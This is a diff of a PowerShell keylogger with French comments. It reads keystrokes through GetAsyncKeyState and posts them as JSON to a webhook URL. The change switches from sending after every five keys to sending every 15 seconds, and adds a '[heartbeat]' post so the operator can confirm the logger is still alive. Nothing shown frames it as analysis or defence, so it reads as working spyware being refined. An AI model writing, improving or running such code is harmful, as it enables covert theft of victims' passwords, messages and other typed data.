@@ -13,15 +13,24 @@ public class K {
 Add-Type $code
 
 $buf = ''
+$lastSend = Get-Date
+
 while($true){
-    Start-Sleep -m 30  # un peu plus rapide
+    Start-Sleep -m 30
     for($i=8;$i -le 254;$i++){
         if([K]::GetAsyncKeyState($i) -eq -32767){
             $buf += [char]$i
-            if($buf.Length -ge 5){  # ← ENVOIE TOUTES LES 5 TOUCHES (au lieu de 25)
-                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
-                $buf = ''
-            }
         }
+    }
+
+    # Envoi toutes les 15 secondes, même si buffer vide (pour montrer qu'il est vivant)
+    if(((Get-Date) - $lastSend).TotalSeconds -ge 15){
+        if($buf.Length -gt 0){
+            iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+        } else {
+            iwr $webhook -Method Post -Body (@{content="[heartbeat]"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+        }
+        $buf = ''
+        $lastSend = Get-Date
     }
 }
